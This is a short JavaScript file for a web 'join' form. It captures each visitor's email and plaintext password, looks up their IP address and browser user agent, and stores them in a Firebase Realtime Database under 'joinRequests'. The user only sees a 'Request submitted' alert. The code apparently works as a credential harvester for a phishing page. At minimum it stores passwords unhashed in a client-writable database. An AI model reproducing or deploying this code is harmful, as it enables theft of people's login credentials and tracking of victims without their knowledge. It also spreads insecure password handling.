import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCegHNsI5CdyXcP-tSemlBEBHkTqXLwcuk",
  authDomain: "aziz-d8f63.firebaseapp.com",
  databaseURL: "https://aziz-d8f63-default-rtdb.firebaseio.com",
  projectId: "aziz-d8f63",
  storageBucket: "aziz-d8f63.firebasestorage.app",
  messagingSenderId: "455056129020",
  appId: "1:455056129020:web:26d9539f5fbc31d378d079",
  measurementId: "G-3EE5KD013G"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
